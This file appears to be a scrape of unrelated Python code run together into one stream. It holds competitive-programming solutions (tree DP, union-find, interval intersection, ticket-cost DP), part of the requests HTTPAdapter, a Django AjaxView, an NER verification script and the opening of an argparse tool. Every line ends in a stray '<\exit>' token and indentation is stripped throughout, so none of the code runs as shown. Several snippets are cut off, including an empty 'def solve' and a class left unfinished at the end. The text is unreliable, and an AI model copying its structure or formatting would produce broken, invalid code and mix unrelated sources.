cur = 2<\exit>
flag = 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxTurbulenceSize([9,4,2,10,7,8,8,1,9]) == 5<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def distributeCoins(self, root: TreeNode) -> int:<\exit>
self.demand(root)<\exit>
return self.ret<\exit>
def demand(self, node) -> int:<\exit>
if not node:<\exit>
return 0<\exit>
demand_l = self.demand(node.left)<\exit>
demand_r = self.demand(node.right)<\exit>
demand_m = 1 - node.val<\exit>
demand = demand_l + demand_r + demand_m<\exit>
self.ret += abs(demand)<\exit>
return demand<\exit>
import bisect<\exit>
from collections import defaultdict<\exit>
class TimeMap:<\exit>
def __init__(self):<\exit>
self.m = defaultdict(list)<\exit>
def set(self, key: str, value: str, timestamp: int) -> None:<\exit>
n = (timestamp, value)<\exit>
bisect.insort(self.m[key], n)<\exit>
def get(self, key: str, timestamp: int) -> str:<\exit>
if key not in self.m:<\exit>
return ""<\exit>
lst = self.m[key]<\exit>
i = bisect.bisect(lst, (timestamp, ""))<\exit>
if i < len(lst) and lst[i][0] == timestamp:<\exit>
return lst[i][1]<\exit>
i -= 1<\exit>
if i >= 0:<\exit>
return lst[i][1]<\exit>
return ""<\exit>
from typing import List<\exit>
class Solution:<\exit>
def mincostTickets(self, days: List[int], costs: List[int]) -> int:<\exit>
F = [float("inf") for _ in range(366 + 30)]<\exit>
for i in range(366, 366 + 30):<\exit>
F[i] = 0<\exit>
days_set = set(days)<\exit>
for i in range(365, 0, -1):<\exit>
if i not in days_set:<\exit>
F[i] = F[i+1]<\exit>
else:<\exit>
F[i] = min(<\exit>
c + F[i+d]<\exit>
for d, c in zip([1, 7, 30], costs)<\exit>
)<\exit>
return F[1]<\exit>
def mincostTickets_error(self, days: List[int], costs: List[int]) -> int:<\exit>
n = len(days)<\exit>
F = [float("inf") for _ in range(n)]<\exit>
F[-1] = costs[0]<\exit>
for i in range(n-2, -1, -1):<\exit>
for j in range(i+1, n):<\exit>
delta = days[j] - days[i]<\exit>
if delta <= 1:<\exit>
F[i] = min(F[i], costs[0] + F[j])<\exit>
if delta <= 7:<\exit>
F[i] = min(F[i], costs[1] + F[j])<\exit>
if delta <= 30:<\exit>
F[i] = min(F[i], costs[2] + F[j])<\exit>
else:<\exit>
break<\exit>
return F[0]<\exit>
def mincostTickets_error(self, days: List[int], costs: List[int]) -> int:<\exit>
F = [float("inf") for _ in range(365 + 1)]<\exit>
F[0] = 0<\exit>
days_set = set(days)<\exit>
for i in range(1, 366):<\exit>
if i not in days_set:<\exit>
F[i] = F[i-1]<\exit>
else:<\exit>
F[i] = min(F[i], F[i-1] + costs[0])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().mincostTickets([1,4,6,7,8,20], [2,7,15]) == 11<\exit>
from typing import List<\exit>
class Solution:<\exit>
def sumEvenAfterQueries(self, A: List[int], queries: List[List[int]]) -> List[int]:<\exit>
cur_sum = sum(filter(lambda x: x % 2 == 0, A))<\exit>
ret = []<\exit>
for val, idx in queries:<\exit>
prev = A[idx]<\exit>
if prev % 2 == 0:<\exit>
cur_sum -= prev<\exit>
A[idx] += val<\exit>
if A[idx] % 2 == 0:<\exit>
cur_sum += A[idx]<\exit>
ret.append(cur_sum)<\exit>
return ret<\exit>
from typing import List<\exit>
class Interval:<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
class Solution:<\exit>
def intervalIntersection(self, A: List[Interval], B: List[Interval]) -> List[Interval]:<\exit>
i, j = 0, 0<\exit>
m, n = len(A), len(B)<\exit>
ret = []<\exit>
while i < m and j < n:<\exit>
lo = max(A[i].start, B[j].start)<\exit>
hi = min(A[i].end, B[j].end)<\exit>
if lo <= hi:<\exit>
ret.append(Interval(lo, hi))<\exit>
if A[i].end > B[j].end:<\exit>
j += 1<\exit>
else:<\exit>
i += 1<\exit>
return ret<\exit>
def intervalIntersection_complex(self, A: List[Interval], B: List[Interval]) -> List[Interval]:<\exit>
ret = []<\exit>
i = 0<\exit>
j = 0<\exit>
m, n = len(A), len(B)<\exit>
while i < m and j < n:<\exit>
a = A[i]<\exit>
b = B[j]<\exit>
if b.start <= a.end <= b.end:<\exit>
ret.append(Interval(max(a.start, b.start), a.end))<\exit>
i += 1<\exit>
elif a.start <= b.end <= a.end:<\exit>
ret.append(Interval(max(a.start, b.start), b.end))<\exit>
j += 1<\exit>
else:<\exit>
if a.end < b.start:<\exit>
i += 1<\exit>
else:<\exit>
j += 1<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.mp = defaultdict(list)<\exit>
def verticalTraversal(self, root: TreeNode) -> List[List[int]]:<\exit>
self.dfs(root, 0, 0)<\exit>
ret = []<\exit>
mn = min(self.mp)<\exit>
mx = max(self.mp)<\exit>
for i in range(mn, mx+1):<\exit>
ret.append([<\exit>
val<\exit>
for _, val in sorted(self.mp[i])<\exit>
])<\exit>
return ret<\exit>
def dfs(self, node, x, y):<\exit>
if not node:<\exit>
return<\exit>
self.mp[x].append((-y, node.val))<\exit>
self.dfs(node.left, x-1, y-1)<\exit>
self.dfs(node.right, x+1, y-1)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from typing import Tuple<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.mn: Tuple[int] = None<\exit>
def smallestFromLeaf(self, root: TreeNode) -> str:<\exit>
self.dfs(root, deque())<\exit>
if not self.mn:<\exit>
return ""<\exit>
return "".join(<\exit>
chr(e + ord("a"))<\exit>
for e in self.mn<\exit>
)<\exit>
def dfs(self, node, cur_deque):<\exit>
if not node:<\exit>
return<\exit>
cur_deque.appendleft(node.val)<\exit>
if not node.left and not node.right:<\exit>
t = tuple(cur_deque)<\exit>
if not self.mn or t < self.mn:<\exit>
self.mn = t<\exit>
else:<\exit>
self.dfs(node.left, cur_deque)<\exit>
self.dfs(node.right, cur_deque)<\exit>
cur_deque.popleft()<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def addToArrayForm(self, A: List[int], K: int) -> List[int]:<\exit>
carry = K<\exit>
for i in range(len(A)-1, -1, -1):<\exit>
A[i] += carry<\exit>
carry = A[i] // 10<\exit>
A[i] %= 10<\exit>
head = deque()<\exit>
while carry:<\exit>
head.appendleft(carry % 10)<\exit>
carry //= 10<\exit>
return list(head) + A<\exit>
from typing import List<\exit>
class DisjointSet:<\exit>
def __init__(self):<\exit>
self.pi = {}<\exit>
def union(self, x, y):<\exit>
self.pi[self.find(x)] = self.find(y)<\exit>
def find(self, x):<\exit>
if x not in self.pi:<\exit>
self.pi[x] = x<\exit>
elif self.pi[x] != x:<\exit>
self.pi[x] = self.find(self.pi[x])<\exit>
return self.pi[x]<\exit>
class Solution:<\exit>
def equationsPossible(self, equations: List[str]) -> bool:<\exit>
ds = DisjointSet()<\exit>
neqs = []<\exit>
for e in equations:<\exit>
a = e[0]<\exit>
b = e[-1]<\exit>
sign = e[1:-1]<\exit>
if sign == "==":<\exit>
ds.union(a, b)<\exit>
else:<\exit>
neqs.append((a, b))<\exit>
for a, b in neqs:<\exit>
if ds.find(a) == ds.find(b):<\exit>
return False<\exit>
return True<\exit>
class Solution:<\exit>
def brokenCalc(self, X: int, Y: int) -> int:<\exit>
t = 0<\exit>
while Y > X:<\exit>
if Y % 2 == 0:<\exit>
Y //= 2<\exit>
else:<\exit>
Y += 1<\exit>
t += 1<\exit>
return t + X - Y<\exit>
def brokenCalc_TLE(self, X: int, Y: int) -> int:<\exit>
q = [X]<\exit>
t = 0<\exit>
has_larger = False<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e == Y:<\exit>
return t<\exit>
cur = e * 2<\exit>
if cur >= 1:<\exit>
if cur > Y and not has_larger:<\exit>
has_larger = True<\exit>
cur_q.append(cur)<\exit>
elif cur <= Y:<\exit>
cur_q.append(cur)<\exit>
cur = e - 1<\exit>
if cur >= 1:<\exit>
cur_q.append(cur)<\exit>
q = cur_q<\exit>
t += 1<\exit>
raise<\exit>
if __name__ == "__main__":<\exit>
assert Solution().brokenCalc(2, 3) == 2<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.pi = []<\exit>
self.depths = []<\exit>
def isCousins(self, root: TreeNode, x: int, y: int) -> bool:<\exit>
self.dfs(None, root, x, 0)<\exit>
self.dfs(None, root, y, 0)<\exit>
if len(self.pi) != 2:<\exit>
return False<\exit>
return self.pi[0] != self.pi[1] and self.depths[0] == self.depths[1]<\exit>
def dfs(self, pi, node, x, depth):<\exit>
if not node:<\exit>
return<\exit>
if node.val == x:<\exit>
self.pi.append(pi)<\exit>
self.depths.append(depth)<\exit>
return<\exit>
self.dfs(node, node.left, x, depth + 1)<\exit>
self.dfs(node, node.right, x, depth + 1)<\exit>
from typing import List<\exit>
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))<\exit>
class Solution:<\exit>
def orangesRotting(self, grid: List[List[int]]) -> int:<\exit>
m, n = len(grid), len(grid[0])<\exit>
q = []<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if grid[i][j] == 2:<\exit>
q.append((i, j))<\exit>
t = -1<\exit>
while q:<\exit>
t += 1<\exit>
cur_q = []<\exit>
for i, j in q:<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and grid[I][J] == 1:<\exit>
grid[I][J] = 2<\exit>
cur_q.append((I, J))<\exit>
q = cur_q<\exit>
has_fresh = any(<\exit>
grid[i][j] == 1<\exit>
for i in range(m)<\exit>
for j in range(n)<\exit>
)<\exit>
return max(0, t) if not has_fresh else -1<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findJudge(self, N: int, trust: List[List[int]]) -> int:<\exit>
ingress = defaultdict(set)<\exit>
egress =defaultdict(set)<\exit>
for p, q in trust:<\exit>
egress[p].add(q)<\exit>
ingress[q].add(p)<\exit>
for i in range(1, N+1):<\exit>
if len(egress[i]) == 0 and len(ingress[i]) == N - 1:<\exit>
return i<\exit>
return -1<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def insertIntoMaxTree(self, root: TreeNode, val: int) -> TreeNode:<\exit>
if not root:<\exit>
return TreeNode(val)<\exit>
if val > root.val:<\exit>
node = TreeNode(val)<\exit>
node.left = root<\exit>
return node<\exit>
root.right = self.insertIntoMaxTree(root.right, val)<\exit>
return root<\exit>
MOD = 10 ** 9 + 7<\exit>
class Solution(object):<\exit>
def solve_error(self, cipher):<\exit>
N, lst = cipher<\exit>
odd_cnt = len(filter(lambda x: x % 2 == 1, lst))<\exit>
even_cnt = N - odd_cnt<\exit>
a = (2 ** even_cnt) % MOD<\exit>
result = 0<\exit>
result += a - 1<\exit>
i = 2<\exit>
comb = (odd_cnt) * (odd_cnt - 1) / (1 * 2)<\exit>
while i <= odd_cnt:<\exit>
result += comb * a<\exit>
result %= MOD<\exit>
i += 2<\exit>
comb *= (odd_cnt - i + 1) * (odd_cnt - i) / ((i - 1) * i)<\exit>
comb %= MOD<\exit>
return result<\exit>
def solve(self, cipher):<\exit>
N, lst = cipher<\exit>
odd_cnt = len(filter(lambda x: x % 2 == 1, lst))<\exit>
even_cnt = N - odd_cnt<\exit>
a = (2 ** even_cnt) % MOD<\exit>
b = (2 ** (odd_cnt - 1)) % MOD<\exit>
if odd_cnt != 0:<\exit>
result = a - 1 + (b - 1) * a<\exit>
else:<\exit>
result = a - 1<\exit>
return result % MOD<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, lst<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class DisjointSet(object):<\exit>
def __init__(self, n):<\exit>
self.rank = [1 for _ in xrange(n)]<\exit>
self.parent = [i for i in xrange(n)]<\exit>
self.n = n<\exit>
def find(self, i):<\exit>
if i == self.parent[i]:<\exit>
return i<\exit>
else:<\exit>
self.parent[i] = self.find(self.parent[i])<\exit>
return self.parent[i]<\exit>
def union(self, i, j):<\exit>
x = self.find(i)<\exit>
y = self.find(j)<\exit>
if x == y: return<\exit>
self.parent[x] = y<\exit>
self.rank[y] += self.rank[x]<\exit>
def card(self):<\exit>
card = 0<\exit>
for i in xrange(self.n):<\exit>
if self.parent[i] == i:<\exit>
card += 1<\exit>
return card<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, pairs = cipher<\exit>
djs = DisjointSet(N)<\exit>
for a, b in pairs:<\exit>
djs.union(a, b)<\exit>
result = 0<\exit>
for i in xrange(N):<\exit>
if djs.find(i) == i:<\exit>
result += (djs.rank[i]) * (N - djs.rank[i])<\exit>
return result / 2<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N, I = map(int, f.readline().strip().split(' '))<\exit>
pairs = []<\exit>
for i in xrange(I):<\exit>
pairs.append(map(int, f.readline().strip().split(' ')))<\exit>
cipher = N, pairs<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import threading<\exit>
from util.commons_util.decorators.classes import *<\exit>
def print_msg(name, msg):<\exit>
print "%s says: %s" % (name, msg)<\exit>
class AbstractThread(threading.Thread):<\exit>
@Override(threading.Thread)<\exit>
def __init__(self, name, production=False):<\exit>
super(AbstractThread, self).__init__()<\exit>
self.name = name<\exit>
self.production = production<\exit>
def print_msg(self, msg):<\exit>
print_msg(self.name, msg)<\exit>
import threading<\exit>
from decorators.classes import *<\exit>
def print_msg(name, msg):<\exit>
print "%s says: %s" % (name, msg)<\exit>
class AbstractThread(threading.Thread):<\exit>
@Override(threading.Thread)<\exit>
def __init__(self, name, production=False):<\exit>
super(AbstractThread, self).__init__()<\exit>
self.name = name<\exit>
self.production = production<\exit>
def print_msg(self, msg):<\exit>
print_msg(self.name, msg)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M, ppl = cipher<\exit>
team_cnt = 0<\exit>
max_topic = 0<\exit>
for i in xrange(N):<\exit>
for j in xrange(i + 1, N):<\exit>
cnt = self.common_topics(M, ppl[i], ppl[j])<\exit>
if cnt == max_topic:<\exit>
team_cnt += 1<\exit>
elif cnt > max_topic:<\exit>
team_cnt = 1<\exit>
max_topic = cnt<\exit>
return "%d\n%d" % (max_topic, team_cnt)<\exit>
def common_topics(self, M, a, b):<\exit>
topic = a | b<\exit>
topic_cnt = bin(topic).count("1")<\exit>
return topic_cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, M = map(lambda x: int(x), f.readline().strip().split(" "))<\exit>
ppl = []<\exit>
for i in xrange(N):<\exit>
ppl.append(int(f.readline().strip(), 2))<\exit>
cipher = [N, M, ppl]<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import socket<\exit>
from .models import Response<\exit>
from .packages.urllib3.poolmanager import PoolManager, proxy_from_url<\exit>
from .hooks import dispatch_hook<\exit>
from .compat import urlparse<\exit>
from .utils import DEFAULT_CA_BUNDLE_PATH, get_encoding_from_headers<\exit>
from .structures import CaseInsensitiveDict<\exit>
from .packages.urllib3.exceptions import MaxRetryError<\exit>
from .packages.urllib3.exceptions import TimeoutError<\exit>
from .packages.urllib3.exceptions import SSLError as _SSLError<\exit>
from .packages.urllib3.exceptions import HTTPError as _HTTPError<\exit>
from .cookies import extract_cookies_to_jar<\exit>
from .exceptions import ConnectionError, Timeout, SSLError<\exit>
DEFAULT_POOLSIZE = 10<\exit>
DEFAULT_RETRIES = 0<\exit>
class BaseAdapter(object):<\exit>
def __init__(self):<\exit>
super(BaseAdapter, self).__init__()<\exit>
def send(self):<\exit>
raise NotImplementedError<\exit>
def close(self):<\exit>
raise NotImplementedError<\exit>
class HTTPAdapter(BaseAdapter):<\exit>
def __init__(self, pool_connections=DEFAULT_POOLSIZE, pool_maxsize=DEFAULT_POOLSIZE):<\exit>
self.max_retries = DEFAULT_RETRIES<\exit>
self.config = {}<\exit>
super(HTTPAdapter, self).__init__()<\exit>
self.init_poolmanager(pool_connections, pool_maxsize)<\exit>
def init_poolmanager(self, connections, maxsize):<\exit>
self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize)<\exit>
def cert_verify(self, conn, url, verify, cert):<\exit>
if url.startswith('https') and verify:<\exit>
cert_loc = None<\exit>
if verify is not True:<\exit>
cert_loc = verify<\exit>
if not cert_loc:<\exit>
cert_loc = DEFAULT_CA_BUNDLE_PATH<\exit>
if not cert_loc:<\exit>
raise Exception("Could not find a suitable SSL CA certificate bundle.")<\exit>
conn.cert_reqs = 'CERT_REQUIRED'<\exit>
conn.ca_certs = cert_loc<\exit>
else:<\exit>
conn.cert_reqs = 'CERT_NONE'<\exit>
conn.ca_certs = None<\exit>
if cert:<\exit>
if len(cert) == 2:<\exit>
conn.cert_file = cert[0]<\exit>
conn.key_file = cert[1]<\exit>
else:<\exit>
conn.cert_file = cert<\exit>
def build_response(self, req, resp):<\exit>
response = Response()<\exit>
response.status_code = getattr(resp, 'status', None)<\exit>
response.headers = CaseInsensitiveDict(getattr(resp, 'headers', {}))<\exit>
response.encoding = get_encoding_from_headers(response.headers)<\exit>
response.raw = resp<\exit>
if isinstance(req.url, bytes):<\exit>
response.url = req.url.decode('utf-8')<\exit>
else:<\exit>
response.url = req.url<\exit>
extract_cookies_to_jar(response.cookies, req, resp)<\exit>
response.request = req<\exit>
response.connection = self<\exit>
response = dispatch_hook('response', req.hooks, response)<\exit>
return response<\exit>
def get_connection(self, url, proxies=None):<\exit>
proxies = proxies or {}<\exit>
proxy = proxies.get(urlparse(url).scheme)<\exit>
if proxy:<\exit>
conn = proxy_from_url(proxy)<\exit>
else:<\exit>
conn = self.poolmanager.connection_from_url(url)<\exit>
return conn<\exit>
def close(self):<\exit>
self.poolmanager.clear()<\exit>
def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None):<\exit>
conn = self.get_connection(request.url, proxies)<\exit>
self.cert_verify(conn, request.url, verify, cert)<\exit>
try:<\exit>
resp = conn.urlopen(<\exit>
method=request.method,<\exit>
url=request.path_url,<\exit>
body=request.body,<\exit>
headers=request.headers,<\exit>
redirect=False,<\exit>
assert_same_host=False,<\exit>
preload_content=False,<\exit>
decode_content=False,<\exit>
retries=self.max_retries,<\exit>
timeout=timeout,<\exit>
)<\exit>
except socket.error as sockerr:<\exit>
raise ConnectionError(sockerr)<\exit>
except MaxRetryError as e:<\exit>
raise ConnectionError(e)<\exit>
except (_SSLError, _HTTPError) as e:<\exit>
if isinstance(e, _SSLError):<\exit>
raise SSLError(e)<\exit>
elif isinstance(e, TimeoutError):<\exit>
raise Timeout(e)<\exit>
else:<\exit>
raise Timeout('Request timed out.')<\exit>
r = self.build_response(request, resp)<\exit>
if not stream:<\exit>
r.content<\exit>
return r<\exit>
from django.contrib import admin<\exit>
from django.utils.decorators import method_decorator<\exit>
from django.views.decorators.csrf import csrf_exempt<\exit>
from django.views.generic import View<\exit>
from decorators import json_only<\exit>
class AjaxView(View):<\exit>
@method_decorator(json_only)<\exit>
@method_decorator(csrf_exempt)<\exit>
def dispatch(self, *args, **kwargs):<\exit>
return super(AjaxView, self).dispatch(*args, **kwargs)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M, queries = cipher<\exit>
qry = []<\exit>
for query in queries:<\exit>
qry.append((query[0], query[2]))<\exit>
qry.append((query[1] + 1, -query[2]))<\exit>
qry.sort(key=lambda x: (x[0], x[1]))<\exit>
maxa = -1 << 32<\exit>
cur = 0<\exit>
for q in qry:<\exit>
cur += q[1]<\exit>
maxa = max(maxa, cur)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, M = map(int, f.readline().strip().split(' '))<\exit>
queries = []<\exit>
for t in xrange(M):<\exit>
queries.append(map(int, f.readline().strip().split(' ')))<\exit>
cipher = N, M, queries<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
def memoize(func):<\exit>
cache = {}<\exit>
def ret(*args):<\exit>
if args not in cache:<\exit>
cache[args] = func(*args)<\exit>
return cache[args]<\exit>
return ret<\exit>
def memoize_force(func):<\exit>
cache = {}<\exit>
def ret(*args):<\exit>
k = str(args)<\exit>
if k not in cache:<\exit>
cache[k] = func(*args)<\exit>
return cache[k]<\exit>
return ret<\exit>
def memoize_iterable(func):<\exit>
cache = {}<\exit>
def ret(*args):<\exit>
k = tuple(args)<\exit>
if k not in cache:<\exit>
cache[k] = func(*args)<\exit>
return cache[k]<\exit>
return ret<\exit>
from cross_validation import CrossValidator<\exit>
import os<\exit>
import re<\exit>
class TotalVerifier(CrossValidator):<\exit>
def verify(self):<\exit>
RAW_FOLDER = "data"<\exit>
INPUT_FOLDER = "auto"<\exit>
OUTPUT_FOLDER = "auto-tagged-model-all"<\exit>
os.system("java -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier -prop all.prop")<\exit>
for non_auto_file in self.file_names:<\exit>
auto_file = re.sub(r'%s'%(RAW_FOLDER), INPUT_FOLDER, non_auto_file)<\exit>
auto_file = re.sub(r'\.tsv', '.txt', auto_file)<\exit>
auto_file_tagged = re.sub(r'%s'%INPUT_FOLDER, OUTPUT_FOLDER, auto_file)<\exit>
auto_file_tagged = re.sub(r'\.txt', '-tagged.xml', auto_file_tagged)<\exit>
os.system("java -mx500m -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier\<\exit>
-loadClassifier ner-model-all.ser.gz -textFile %s -outputFormat inlineXML > %s"%(auto_file, auto_file_tagged))<\exit>
def do(self):<\exit>
self.verify()<\exit>
if __name__=="__main__":<\exit>
TotalVerifier().do()<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
def solve_time_out(self, cipher):<\exit>
A = cipher<\exit>
L = [-1 for _ in A]<\exit>
S = [-1 for _ in A]<\exit>
for i in xrange(len(A) - 2, -1, -1):<\exit>
idx = i + 1<\exit>
while idx != -1:<\exit>
if A[idx] < A[i]:<\exit>
idx = L[idx]<\exit>
else:<\exit>
break<\exit>
L[i] = idx<\exit>
idx = i + 1<\exit>
while idx != -1:<\exit>
if A[idx] > A[i]:<\exit>
idx = S[idx]<\exit>
else:<\exit>
break<\exit>
S[i] = idx<\exit>
cnt = 0<\exit>
for i in xrange(len(A)):<\exit>
cnt += 1<\exit>
l = L[i]<\exit>
s = S[i]<\exit>
while l != -1 and (s == -1 or s > l):<\exit>
cnt += 1<\exit>
l = L[l]<\exit>
return cnt<\exit>
def solve_error(self, cipher):<\exit>
A = cipher<\exit>
N = len(A)<\exit>
start = 0<\exit>
end = 1<\exit>
cnt = 0<\exit>
while end < N:<\exit>
if A[end] > A[end - 1]:<\exit>
end += 1<\exit>
else:<\exit>
cnt += self.count(start, end)<\exit>
start = end<\exit>
end += 1<\exit>
cnt += self.count(start, end)<\exit>
return cnt<\exit>
def count(self, start, end):<\exit>
l = end - start<\exit>
return (l + 1) * l / 2<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
N = len(A)<\exit>
start = 0<\exit>
while start + 1 < N and A[start] <= A[start + 1]:<\exit>
start += 1<\exit>
end = start + 1<\exit>
while end + 1 < N and A[end] >= A[end + 1]:<\exit>
end += 1<\exit>
if end == start + 1:<\exit>
j = start + 1<\exit>
while j + 1 < N and A[j] < A[j + 1]:<\exit>
j += 1<\exit>
if j != start + 1 and j + 1 == N:<\exit>
return "no"<\exit>
i = j + 1<\exit>
while i + 1 < N:<\exit>
if not A[i] < A[i + 1]:<\exit>
return "no"<\exit>
i += 1<\exit>
if j != start + 1:<\exit>
j += 1<\exit>
return "yes\nswap %d %d" % (start + 1, j + 1)<\exit>
else:<\exit>
i = end + 1<\exit>
while i + 1 < N:<\exit>
if not A[i] < A[i + 1]:<\exit>
return "no"<\exit>
i += 1<\exit>
if end + 1 < N and A[start] > A[end + 1]:<\exit>
return "no"<\exit>
return "yes\nreverse %d %d" % (start + 1, end + 1)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
lst = list(cipher)<\exit>
ret = [lst[0]]<\exit>
cnt = 0<\exit>
for i in xrange(1, len(lst)):<\exit>
if lst[i] != ret[-1]:<\exit>
ret.append(lst[i])<\exit>
else:<\exit>
cnt += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
cipher = cipher[0]<\exit>
length = len(cipher)<\exit>
if length & 1 == 1:<\exit>
return -1<\exit>
str1 = cipher[:length / 2]<\exit>
str2 = cipher[length / 2:]<\exit>
bucket = [0 for _ in xrange(256)]<\exit>
for elt in str1:<\exit>
bucket[ord(elt)] += 1<\exit>
for elt in str2:<\exit>
bucket[ord(elt)] -= 1<\exit>
return sum(filter(lambda x: x > 0, bucket))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip().split(' ')<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def anagrams(self, strs):<\exit>
ret = []<\exit>
cnt = defaultdict(int)<\exit>
for s in strs:<\exit>
enc = self.encode(s)<\exit>
cnt[enc] += 1<\exit>
for s in strs:<\exit>
enc = self.encode(s)<\exit>
if cnt[enc] > 1:<\exit>
ret.append(s)<\exit>
return ret<\exit>
def encode(self, s):<\exit>
ret = [0 for _ in xrange(26)]<\exit>
for c in s:<\exit>
ret[ord(c)-ord('a')] += 1<\exit>
return "".join(map(str, ret))<\exit>
class Solution(object):<\exit>
def solve_TLE(self, cipher):<\exit>
N, K, lst = cipher<\exit>
lst.sort()<\exit>
global_min = 1 << 32 - 1<\exit>
for i in xrange(N - K):<\exit>
seq = lst[i: i + K]<\exit>
global_min = min(global_min, max(seq) - min(seq))<\exit>
return global_min<\exit>
def solve_TLE2(self, cipher):<\exit>
N, K, lst = cipher<\exit>
lst.sort()<\exit>
seq = lst[0: K]<\exit>
mini = min(seq)<\exit>
maxa = max(seq)<\exit>
global_min = maxa - mini<\exit>
for i in xrange(K, N):<\exit>
popped = seq.pop(0)<\exit>
cur = lst[i]<\exit>
seq.append(cur)<\exit>
if popped != mini:<\exit>
mini = min(mini, cur)<\exit>
else:<\exit>
mini = min(seq)<\exit>
if popped != maxa:<\exit>
maxa = max(maxa, cur)<\exit>
else:<\exit>
maxa = max(seq)<\exit>
global_min = min(global_min, maxa - mini)<\exit>
return global_min<\exit>
def solve(self, cipher):<\exit>
N, K, lst = cipher<\exit>
lst.sort()<\exit>
mini = lst[0]<\exit>
maxa = lst[K - 1]<\exit>
global_min = maxa - mini<\exit>
for i in xrange(1, N - K):<\exit>
mini = lst[i]<\exit>
maxa = lst[i + K - 1]<\exit>
global_min = min(global_min, maxa - mini)<\exit>
return global_min<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
K = int(f.readline().strip())<\exit>
lst = []<\exit>
for t in xrange(N):<\exit>
lst.append(int(f.readline().strip()))<\exit>
cipher = (N, K, lst)<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import argparse<\exit>
except ImportError:<\exit>
from os.path import basename<\exit>
from sys import path as sys_path<\exit>
sys_path.append(join_path(basename(__file__), '../server/lib'))<\exit>
import argparse<\exit>
class ArgumentError(Exception):<\exit>
def __init__(self, s):<\exit>
self.errstr = s<\exit>
def __str__(self):<\exit>
return 'Argument error: %s' % (self.errstr)<\exit>
def argparser():<\exit>
ap=argparse.ArgumentParser(description="Remove portions of text from annotated files.")<\exit>
ap.add_argument("-c", "--characters", metavar="[LIST]", default=None,<\exit>
help="Select only these characters")<\exit>
ap.add_argument("--complement", default=False, action="store_true",<\exit>
help="Complement the selected spans of text")<\exit>
ap.add_argument("file", metavar="FILE", nargs=1,<\exit>
help="Annotation file")<\exit>
return ap<\exit>
class Annotation(object):<\exit>
